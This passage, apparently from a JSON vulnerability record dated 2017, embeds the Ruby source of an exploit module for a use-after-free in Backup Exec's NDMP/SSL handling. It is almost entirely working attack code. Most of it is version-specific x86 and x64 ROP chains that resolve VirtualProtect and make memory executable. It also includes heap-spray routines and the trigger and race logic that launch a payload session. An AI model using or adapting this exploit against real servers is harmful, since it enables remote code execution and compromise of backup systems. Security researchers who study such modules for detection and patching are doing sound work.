code.\n  #\n  def generate_stages_2_to_4\n    stage_4 = payload.encoded\n\n    if target.opts['Arch'] == ARCH_X64\n      if target.opts['Version'] == 14\n        stage_3 = [\n          0,         # skipped by stage 2\n          0xbe31359, # push rax; pop rsi; ret\n          0xbe01f72, # pop rax; ret\n          0,\n          0xbe3d250, # add rax, rcx; ret\n          0xbe1c2f9, # pop r12; ret\n          0xbe2ab32, # pop r8; ret\n          0xbe2987c, # mov rcx, rax; call r12\n          0xbe46d9e, # jmp qword ptr [KERNEL32!LoadLibraryW]\n          0xbe4e511, # pop r14; pop r13; pop rdi; pop rbp; ret\n          0,\n          0,\n          0,\n          0,\n          0xbe37f75, # push rax; pop rdi; ret\n          0xbe43b25, # mov rcx, rsi; call r12\n          0xbe01f72, # pop rax; ret\n          0,\n          0xbe3d250, # add rax, rcx; ret\n          0xbe6949a, # push rax; pop r12; ret\n          0xbe4f7ec, # pop r14; pop r13; ret\n          0xbe2ab32, # pop r8; ret\n          0,\n          0xbe2f917, # mov rdx, r12; mov ecx, 4; call r14\n          0xbe01f72, # pop rax; ret\n          0xbe2ab32, # pop r8; ret\n          0xbe36e8e, # mov rcx, rdi; call rax\n          0xbe01a29, # ret\n          0xbe46d32, # jmp qword ptr [KERNEL32!GetProcAddressStub]\n          0xbe4e511, # pop r14; pop r13; pop rdi; pop rbp; ret\n          0,\n          0,\n          0,\n          0,\n          0xbe37f75, # push rax; pop rdi; ret\n          0xbe1c2f9, # pop r12; ret\n          0xbe2ab32, # pop r8; ret\n          0xbe43b25, # mov rcx, rsi; call r12\n          0xbe399d0, # pop r13; ret\n          1 << 31,\n          0xbe33c3e, # mov rdx, r13; call r12\n          0xbe6b790, # mov r9, rcx; test edx, edx; jns 0xbe6b7a3; xor eax, eax; ret\n          0xbe399d0, # pop r13; ret\n          0,\n          0xbe33c3e, # mov rdx, r13; call r12\n          0xbe2ab32, # pop r8; ret\n          0x40,      # PAGE_EXECUTE_READWRITE\n          0xbe01a29, # ret\n          0xbe5180b, # jmp rdi\n          0xbe4e511, # pop r14; pop r13; pop rdi; pop rbp; ret\n          0,\n          0,\n          0,\n          0,\n          0xbe63938  # push rsp; ret\n        ]\n        stage_3[3] = stage_3[43] = stage_3.length * 8 + stage_4.length\n        kernel32_dll = \"KERNEL32.dll\\0\".encode('UTF-16LE').force_encoding('ASCII-8BIT')\n        stage_3[17] = stage_3[3] + kernel32_dll.length\n        stage_3 = stage_3.pack('Q<*') + stage_4 + kernel32_dll + \"VirtualProtect\\0\"\n      elsif target.opts['Version'] == 15\n        stage_3 = [\n          0xbe68a34, # push rax; pop rbx; ret\n          0xbe087c8, # pop rax; ret\n          0,\n          0xbe60dc0, # add rax, rcx; ret\n          0xbe9b627, # mov rcx, rax; call r12\n          0xbe4929d, # ret\n          0xbeb488e, # jmp qword ptr [KERNEL32!LoadLibraryAStub]\n          0xbea47f9, # pop r15; pop r14; pop r13; pop rbp; ret\n          0,\n          0,\n          0,\n          0,\n          0xbe34c0c, # push rax; pop rbp; ret\n          0xbefc534, # mov rcx, rbx; call r12\n          0xbe087c8, # pop rax; ret\n          0,\n          0xbe60dc0, # add rax, rcx; ret\n          0xbe9b627, # mov rcx, rax; call r12\n          0xbefc526, # mov rdx, rcx; call r12\n          0xbe9ad68, # mov rcx, rbp; call r12\n          0xbeb4828, # jmp qword ptr [KERNEL32!GetProcAddressStub]\n          0xbea47f9, # pop r15; pop r14; pop r13; pop rbp; ret\n          0,\n          0,\n          0,\n          0,\n          0xbe43269, # push rax; pop rsi; ret\n          0xbefc534, # mov rcx, rbx; call r12\n          0xbebd50e, # pop r13; ret\n          0,\n          0xbe97c4e, # mov rdx, r13; call r12\n          0xbeae99d, # pop r8; ret\n          0x40,      # PAGE_EXECUTE_READWRITE\n          0xbe3c9c0, # test rdx, rdx; setne al; ret\n          0xbe68603, # mov r9, rcx; je 0xbe68612; xor eax, eax; ret\n          0xbe4929d, # ret\n          0xbe9436d, # jmp rsi\n          0xbea47f9, # pop r15; pop r14; pop r13; pop rbp; ret\n          0,\n          0,\n          0,\n          0,\n          0xbe2184d, # pop rdi; ret\n          0xbebd50e, # pop r13; ret\n          0xbe9a8ac  # push rsp; and al, 0x20; mov r8d, ebx; mov rcx, rsi; call rdi\n        ]\n        stage_3[2] = stage_3[29] = stage_3.length * 8 + stage_4.length\n        stage_3[15] = stage_3[2] + \"KERNEL32.dll\\0\".length\n        stage_3 = stage_3.pack('Q<*') + stage_4 + \"KERNEL32.dll\\0VirtualProtect\\0\"\n      elsif target.opts['Version'] == 16\n        stage_3 = [\n          0xbe4e888, # push rax; pop rbx; ret\n          0xbe01f72, # pop rax; ret\n          0,\n          0xbe610f0, # add rax, rcx; ret\n          0xbe9c70c, # mov rcx, rax; call r12\n          0xbe01c2c, # ret\n          0xbeb5d8e, # jmp qword ptr [KERNEL32!LoadLibraryAStub]\n          0xbea5b39, # pop r15; pop r14; pop r13; pop rbp; ret\n          0,\n          0,\n          0,\n          0,\n          0xbe12ed0, # pop rdi; ret\n          0xbe45a01, # pop r13; ret\n          0xbeaedb0, # mov rbp, rax; call rdi\n          0xbe5851a, # mov rcx, rbx; call r12\n          0xbe01f72, # pop rax; ret\n          0,\n          0xbe610f0, # add rax, rcx; ret\n          0xbe9c70c, # mov rcx, rax; call r12\n          0xbefe516, # mov rdx, rcx; call r12\n          0xbe9bf28, # mov rcx, rbp; call r12\n          0xbeb5d28, # jmp qword ptr [KERNEL32!GetProcAddressStub]\n          0xbea5b39, # pop r15; pop r14; pop r13; pop rbp; ret\n          0,\n          0,\n          0,\n          0,\n          0xbe433b9, # push rax; pop rsi; ret\n          0xbe5851a, # mov rcx, rbx; call r12\n          0xbe45a01, # pop r13; ret\n          0,\n          0xbe2e55e, # mov rdx, r13; call r12\n          0xbe27c76, # pop r8; ret\n          0x40,      # PAGE_EXECUTE_READWRITE\n          0xbe3caf0, # test rdx, rdx; setne al; ret\n          0xbe68c73, # mov r9, rcx; je 0xbe68c82; xor eax, eax; ret\n          0xbe01c2c, # ret\n          0xbe56cad, # jmp rsi\n          0xbea5b39, # pop r15; pop r14; pop r13; pop rbp; ret\n          0,\n          0,\n          0,\n          0,\n          0xbe12ed0, # pop rdi; ret\n          0xbe45a01, # pop r13; ret\n          0xbe9ba6c  # push rsp; and al, 0x20; mov r8d, ebx; mov rcx, rsi; call rdi\n        ]\n        stage_3[2] = stage_3[31] = stage_3.length * 8 + stage_4.length\n        stage_3[17] = stage_3[2] + \"KERNEL32.dll\\0\".length\n        stage_3 = stage_3.pack('Q<*') + stage_4 + \"KERNEL32.dll\\0VirtualProtect\\0\"\n      end\n    else\n      if target.opts['Version'] == 14\n        stage_3 = [\n          0x63117dfa, # pop edi; ret\n          0x63101514, # ret\n          0x63116cc9, # pop esi; ret\n          0x6313ba14, # jmp dword ptr [KERNEL32!LoadLibraryAStub]\n          0x631017ff, # pop ebp; ret\n          0x631213e6, # add esp, 0x20; ret\n          0x63137a3c, # pushal; ret\n          'KERN'.unpack('L<')[0],\n          'EL32'.unpack('L<')[0],\n          '.dll'.unpack('L<')[0],\n          0,\n          0x63117dfa, # pop edi; ret\n          0x6311de4c, # pop edi; pop ebp; ret\n          0x6311b614, # push eax; call edi\n          0x63117dfa, # pop edi; ret\n          0x6313b9ae, # jmp dword ptr [KERNEL32!GetProcAddressStub]\n          0x63116cc9, # pop esi; ret\n          0x631213e6, # add esp, 0x20; ret\n          0x63137a3c, # pushal; ret\n          'Virt'.unpack('L<')[0],\n          'ualP'.unpack('L<')[0],\n          'rote'.unpack('L<')[0],\n          \"ct\\0\\0\".unpack('L<')[0],\n          0x6314de45, # xchg eax, edi; ret\n          0x6311db46, # push esp; pop esi; ret\n          0x6311a398, # xchg eax, esi; ret\n          0x63116cc9, # pop esi; ret\n          0x6311f902, # pop ebx; pop ecx; ret\n          0x63123d89, # push eax; call esi\n          0x6316744a, # push edi; sbb al, 0x5f; pop esi; pop ebp; pop ebx; ret\n          0x63101514, # ret\n          0,\n          0x631309f4, # pop edx; or al, 0xf6; ret\n          0x40,       # PAGE_EXECUTE_READWRITE\n          0x63117dfa, # pop edi; ret\n          0x63101514, # ret\n          0x6310185a, # pop eax; ret\n          0x63139ec5, # push esp; ret\n          0x63137a3c  # pushal; ret\n        ]\n        stage_3[31] = stage_4.length + 4\n      elsif target.opts['Version'] == 15\n        stage_3 = [\n          0x6311e378, # pop edi; ret\n          0x63101564, # ret\n          0x631289b9, # pop esi; ret\n          0x6319e296, # jmp dword ptr [KERNEL32!LoadLibraryA]\n          0x6310184f, # pop ebp; ret\n          0x6313937d, # add esp, 0x20; ret\n          0x6311c618, # pushal; ret\n          'KERN'.unpack('L<')[0],\n          'EL32'.unpack('L<')[0],\n          '.dll'.unpack('L<')[0],\n          0,\n          0x63198d07, # xchg eax, ebp; mov edi, 0xc483fff9; or al, 0x5e; ret\n          0x6311e378, # pop edi; ret\n          0x6319e23c, # jmp dword ptr [KERNEL32!GetProcessAddress]\n          0x631289b9, # pop esi; ret\n          0x6313937d, # add esp, 0x20; ret\n          0x6311c618, # pushal; ret\n          'Virt'.unpack('L<')[0],\n          'ualP'.unpack('L<')[0],\n          'rote'.unpack('L<')[0],\n          \"ct\\0\\0\".unpack('L<')[0],\n          0x631289b9, # pop esi; ret\n          0x631018aa, # pop eax; ret\n          0x63198446, # mov edi, eax; call esi\n          0x63137496, # push esp; pop esi; ret\n          0x6312c068, # xchg eax, esi; ret\n          0x631289b9, # pop esi; ret\n          0x6315c407, # pop ebx; pop ecx; ret\n          0x63189809, # push eax; call esi\n          0x631d7cca, # push edi; sbb al, 0x5f; pop esi; pop ebp; pop ebx; ret\n          0x63101564, # ret\n          0,\n          0x63156a54, # pop edx; or al, 0xf6; ret\n          0x40,       # PAGE_EXECUTE_READWRITE\n          0x6311e378, # pop edi; ret\n          0x63101564, # ret\n          0x631018aa, # pop eax; ret\n          0x6311c638, # push esp; ret\n          0x6311c618  # pushal; ret\n        ]\n        stage_3[31] = stage_4.length + 4\n      elsif target.opts['Version'] == 16\n        stage_3 = [\n          0x6311e3c0, # pop edi; ret\n          0x63101564, # ret\n          0x63128a39, # pop esi; ret\n          0x6319f27c, # jmp dword ptr [KERNEL32!LoadLibraryAStub]\n          0x6310184f, # pop ebp; ret\n          0x631394ad, # add esp, 0x20; ret\n          0x6311c69c, # pushal; ret\n          'KERN'.unpack('L<')[0],\n          'EL32'.unpack('L<')[0],\n          '.dll'.unpack('L<')[0],\n          0,\n          0x6311e3c0, # pop edi; ret\n          0x631018aa, # pop eax; ret\n          0x6319959f, # mov ebp, eax; call edi\n          0x6311e3c0, # pop edi; ret\n          0x6319f21c, # jmp dword ptr [KERNEL32!GetProcessAddressStub]\n          0x63128a39, # pop esi; ret\n          0x631394ad, # add esp, 0x20; ret\n          0x6311c69c, # pushal; ret\n          'Virt'.unpack('L<')[0],\n          'ualP'.unpack('L<')[0],\n          'rote'.unpack('L<')[0],\n          \"ct\\0\\0\".unpack('L<')[0],\n          0x63128a39, # pop esi; ret\n          0x631018aa, # pop eax; ret\n          0x631993e6, # mov edi, eax; call esi\n          0x631375e6, # push esp; pop esi; ret\n          0x6312c0e8, # xchg eax, esi; ret\n          0x63128a39, # pop esi; ret\n          0x63133031, # pop ebx; pop ecx; ret\n          0x6314a34a, # push eax; call esi\n          0x631d830a, # push edi; sbb al, 0x5f; pop esi; pop ebp; pop ebx; ret\n          0x63101564, # ret\n          0,\n          0x63157084, # pop edx; or al, 0xf6; ret\n          0x40,       # PAGE_EXECUTE_READWRITE\n          0x6311e3c0, # pop edi; ret\n          0x63101564, # ret\n          0x631018aa, # pop eax; ret\n          0x63134eb6, # push esp; ret\n          0x6311c69c  # pushal; ret\n        ]\n        stage_3[33] = stage_4.length + 4\n      end\n      stage_3 = stage_3.pack('L<*') + stage_4\n    end\n\n    if target.opts['Arch'] == ARCH_X64\n      if target.opts['Version'] == 14\n        stage_2 = [\n          0xbe40d1d, # pop r12; pop rsi; ret\n          0xbe1bca3, # pop r12; pop rbx; ret\n          0xbe399d0, # pop r13; ret\n          0xbe29954, # push rsp; and al, 0x70; mov rcx, rax; call r12\n          0xbe501a7, # mov rcx, rbx; call rsi\n          0xbe01f72, # pop rax; ret\n          0,\n          0xbe3d250, # add rax, rcx; ret\n          0xbe37f75, # push rax; pop rdi; ret\n          0xbe4f52c, # mov rax, qword ptr gs:[0x30]; ret\n          0xbe24263, # mov rax, qword ptr [rax + 8]; ret\n          0xbe1b055, # pop rbx; ret\n          0xfffffffffffff000,\n          0xbe501a7, # mov rcx, rbx; call rsi\n          0xbe3d250, # add rax, rcx; ret\n          0xbe1c2f9, # pop r12; ret\n          0xbe2ab32, # pop r8; ret\n          0xbe2987c, # mov rcx, rax; call r12\n          0xbe1b055, # pop rbx; ret\n          0xbe2ab32, # pop r8; ret\n          0xbe45935, # mov rdx, rdi; call rbx\n          0xbe01a29, # ret\n          0xbe2ab32, # pop r8; ret\n          0,\n          0xbe4fa46, # jmp qword ptr [MSVCR100!memcpy]\n          0xbe2987c, # mov rcx, rax; call r12\n          0xbe1cfc0  # mov rsp, r11; pop r12; ret (note need for extra ret at start of stage 3)\n        ]\n      elsif target.opts['Version'] == 15\n        stage_2 = [\n          0xbe1e18e, # pop r12; pop rdi; ret\n          0xbebd50e, # pop r13; ret\n          0xbebc3fd, # pop r14; pop rbp; ret\n          0xbe9a8ac, # push rsp; and al, 0x20; mov r8d, ebx; mov rcx, rsi; call rdi\n          0xbe9ad68, # mov rcx, rbp; call r12\n          0xbe087c8, # pop rax; ret\n          0,\n          0xbe60dc0, # add rax, rcx; ret\n          0xbe43269, # push rax; pop rsi; ret\n          0xbebd24c, # mov rax, qword ptr gs:[0x30]; ret\n          0xbe3b0b3, # mov rax, qword ptr [rax + 8]; ret\n          0xbe1d923, # pop r12; pop rbx; ret\n          0xfffffffffffff000,\n          0xbe27c76, # pop r8; ret\n          0xbe45511, # mov rcx, r12; call rbx\n          0xbe60dc0, # add rax, rcx; ret\n          0xbe1df29, # pop r12; ret\n          0xbe27c76, # pop r8; ret\n          0xbe9b54c, # mov rcx, rax; call r12\n          0xbe01f72, # pop rax; ret\n          0xbe27c76, # pop r8; ret\n          0xbe4164c, # mov rdx, rsi; call rax\n          0xbeae99d, # pop r8; ret\n          0,\n          0xbebda22, # jmp qword ptr [MSVCR100!memcpy]\n          0xbe9b627, # mov rcx, rax; call r12\n          0xbeeb621  # push rcx; pop rsp; ret\n        ]\n      elsif target.opts['Version'] == 16\n        stage_2 = [\n          0xbe1e18e, # pop r12; pop rdi; ret\n          0xbe45a01, # pop r13; ret\n          0xbe2a433, # pop r14; pop rbp; ret\n          0xbe9ba6c, # push rsp; and al, 0x20; mov r8d, ebx; mov rcx, rsi; call rdi\n          0xbe9bf28, # mov rcx, rbp; call r12\n          0xbe01f72, # pop rax; ret\n          0,\n          0xbe610f0, # add rax, rcx; ret\n          0xbe433b9, # push rax; pop rsi; ret\n          0xbebe74c, # mov rax, qword ptr gs:[0x30]; ret\n          0xbe3b1e3, # mov rax, qword ptr [rax + 8]; ret\n          0xbe1d923, # pop r12; pop rbx; ret\n          0xfffffffffffff000,\n          0xbe27c76, # pop r8; ret\n          0xbe45681, # mov rcx, r12; call rbx\n          0xbe610f0, # add rax, rcx; ret\n          0xbe1df29, # pop r12; ret\n          0xbe27c76, # pop r8; ret\n          0xbe9c70c, # mov rcx, rax; call r12\n          0xbe01f72, # pop rax; ret\n          0xbe27c76, # pop r8; ret\n          0xbe4179c, # mov rdx, rsi; call rax\n          0xbe27c76, # pop r8; ret\n          0,\n          0xbebef22, # jmp qword ptr [MSVCR100!memcpy]\n          0xbe9c70c, # mov rcx, rax; call r12\n          0xbeed611  # push rcx; pop rsp; ret\n        ]\n      end\n      stage_2[6] = (stage_2.length - 4) * 8\n      stage_2[23] = stage_3.length\n      stage_2 = stage_2.pack('Q<*') + stage_3\n    else\n      if target.opts['Version'] == 14\n        stage_2 = [\n          0x63143720, # mov eax, dword ptr fs:[0x18]; ret\n          0x6311efa4, # mov eax, dword ptr [eax + 4]; ret\n          0x63129b75, # pop edi; pop ecx; ret\n          0xfffffff0,\n          0x100000000 - 0x2000,\n          0x63122eea, # and eax, edi; pop edi; pop esi; add esp, 0xc; ret\n          0x63129b75, # pop edi; pop ecx; ret\n          0x6310185a, # pop eax; ret\n          0,\n          0,\n          0,\n          0x63133912, # add eax, ecx; ret\n          0x63152ded, # mov ebx, eax; call esi\n          0x631309f4, # pop edx; or al, 0xf6; ret\n          0x6314cfa1, # xchg eax, esp; ret\n          0x6311db46, # push esp; pop esi; ret\n          0x6310185a, # pop eax; ret\n          0x6310185a, # pop eax; ret\n          0x631171d2, # mov ecx, esi; call eax\n          0x6310185a, # pop eax; ret\n          0,\n          0x63133912, # add eax, ecx; ret\n          0x631257f4, # push ebx; call edi\n          0x631546eb, # pop edi; ret\n          0x631543cb, # pop ebp; pop esi; pop edi; ret\n          0x63116faf, # pop ebx; ret\n          0x63143aec, # jmp dword ptr [MSVCR100!memcpy]\n          0x6315dde0, # cld; ret\n          0x63137a3c, # pushal; ret\n          0\n        ]\n        stage_2[20] = (stage_2.length - 16) * 4\n        stage_2[29] = stage_3.length\n      elsif target.opts['Version'] == 15\n        stage_2 = [\n          0x631a6220, # mov eax, dword ptr fs:[0x18]; ret\n          0x6312e404, # mov eax, dword ptr [eax + 4]; ret\n          0x6313031d, # pop ebp; pop ecx; ret\n          0x100000000 - 0x2000,\n          0xfffffff0,\n          0x6316c73a, # and eax, ecx; pop esi; ret\n          0x6315c407, # pop ebx; pop ecx; ret\n          0x63192b17, # add eax, ebp; ret\n          0x63189809, # push eax; call esi\n          0x63156a54, # pop edx; or al, 0xf6; ret\n          0x6312c933, # xchg eax, esp; ret\n          0x63137496, # push esp; pop esi; ret\n          0x6314172a, # pop eax; ret\n          0,\n          0x6317e87d, # add eax, esi; pop edi; pop esi; pop ebx; ret\n          0x63156dd8, # pop edi; pop ebp; pop esi; ret\n          0,\n          0,\n          0x631729cd, # pop ebx; ret\n          0x631a65ec, # jmp dword ptr [MSVCR100!memcpy]\n          0x6311e250, # cld; ret\n          0x6311c618, # pushal; ret\n          0\n        ]\n        stage_2[13] = (stage_2.length - 12) * 4\n        stage_2[22] = stage_3.length\n      elsif target.opts['Version'] == 16\n        stage_2 = [\n          0x631a7200, # mov eax, dword ptr fs:[0x18]; ret\n          0x6312e4a4, # mov eax, dword ptr [eax + 4]; ret\n          0x63128afc, # pop ecx; ret\n          0xfffffff0,\n          0x6316d13a, # and eax, ecx; pop esi; ret\n          0x63133031, # pop ebx; pop ecx; ret\n          0x63128afc, # pop ecx; ret\n          0x100000000 - 0x2000,\n          0x63142860, # add eax, ecx; ret\n          0x6314a34a, # push eax; call esi\n          0x63157084, # pop edx; or al, 0xf6; ret\n          0x6311c6c0, # xchg eax, esp; ret\n          0x631375e6, # push esp; pop esi; ret\n          0x631018aa, # pop eax; ret\n          0,\n          0x63135f56, # add eax, esi; add eax, ecx; pop esi; ret\n          0,\n          0x63157408, # pop edi; pop ebp; pop esi; ret\n          0x63157408, # pop edi; pop ebp; pop esi; ret\n          0,\n          0,\n          0x63181046, # sub eax, ecx; pop ebx; ret\n          0x631a75cc, # jmp dword ptr [MSVCR100!memcpy]\n          0x6311e298, # cld; ret\n          0x6311c69c, # pushal; ret\n          0\n        ]\n        stage_2[14] = (stage_2.length - 13) * 4\n        stage_2[25] = stage_3.length\n      end\n      stage_2 = stage_2.pack('L<*') + stage_3\n    end\n\n    stage_2 + rand_text(stage_2.length & 1)\n  end\n\n  #\n  # Attempt to overwrite the freed BIO struct with stage 1 and trigger the use-after-free.\n  #\n  def attempt_triggers(s, spray_socks, spray_msg)\n    datastore['NumTriggerAttempts'].times do |x|\n      print_status('Spraying stage 1...')\n      (1..2).each do |phase|\n        spray_socks.each do |ss|\n          if phase == 1\n            return false unless ss.prepare_and_write_ndmp_msg(spray_msg, false, 50)\n            return true if @payload_connected || session_created?\n          else\n            50.times do\n              return false unless ss.read_ndmp_msg(spray_msg.header.type)\n              return true if @payload_connected || session_created?\n            end\n          end\n        end\n      end\n      sleep(1)\n      return true if @payload_connected || session_created?\n\n      # Send a certain amount of data per trigger attempt so that stage 1 will always end\n      # up jumping into the TLS/SSLv2 record at an expected location. The general idea is\n      # that the first write will complete Backup Exec's first recv operation, the second\n      # fills the buffer back up to an 8/4-byte aligned position, and the rest moves\n      # through the retsled\n      print_status(\"Triggering UAF, attempt #{x + 1}/#{datastore['NumTriggerAttempts']}...\")\n      trigger = if target.opts['Version'] == 14\n        if x == 0\n          # A maximum of 5 bytes are always read at first, so just send them all at once\n          \"\\x16\\x03\\x01\\x10\\x00\"\n        elsif x == 1\n          # Skip over TLS header structure\n          rand_text((target.opts['Arch'] == ARCH_X64 ? 0x18 : 0x10) - 5)\n        else\n          # Skip over a ROP NOP\n          rand_text(target.opts['Arch'] == ARCH_X64 ? 8 : 4)\n        end\n      else\n        if x == 0\n          # A maximum of 11 bytes are always read at first, so just send them all at once\n          \"\\x90\\x00\\x01\\x03\\x03\" + rand_text(11 - 5)\n        elsif x == 1\n          # Skip over SSLv2 header structure\n          rand_text((target.opts['Arch'] == ARCH_X64 ? 0x20 : 0x10) - 11)\n        else\n          # Skip over a ROP NOP\n          rand_text(target.opts['Arch'] == ARCH_X64 ? 8 : 4)\n        end\n      end\n      return false unless s.raw_sendall(trigger, 0)\n      sleep(1)\n      return true if @payload_connected || session_created?\n    end\n\n    nil\n  end\n\n  #\n  # Attempt to overwrite the freed BIO struct with stage 1 and implicitly trigger the\n  # use-after-free in a race.\n  #\n  # For non-Windows 8+ targets, we need to race Backup Exec after the BIO struct is freed.\n  # This is because these versions of Windows overwrite the start of freed objects on the\n  # heap with the next offset in the freelist. We need to then overwrite this with our\n  # stage 1 spray otherwise Backup Exec will crash upon attempting to call the BIO\n  # struct's read callback upon re-entering SSL mode. This is less successful than the\n  # Windows 8+ case (which doesn't use a freelist, instead using a free bitmap), but it\n  # still works OK.\n  #\n  def attempt_race(s, spray_socks, spray_msg, ca_cert_id)\n    print_status('Spraying stage 1 while racing re-entering SSL mode on main socket...')\n    do_simple_ssl_request(s, SSLRequest::Opcode.start_ssl, ca_cert_id) do |is_pre|\n      unless is_pre\n        200.times do\n          spray_socks.each do |ss|\n            ss.prepare_and_write_ndmp_msg(spray_msg, 200)\n            return true if @payload_connected || session_created?\n          end\n        end\n      end\n    end\n    sleep(1)\n\n    @payload_connected || session_created?\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-10",
    "x_mitre_platforms": [
        "win'"
    ]
}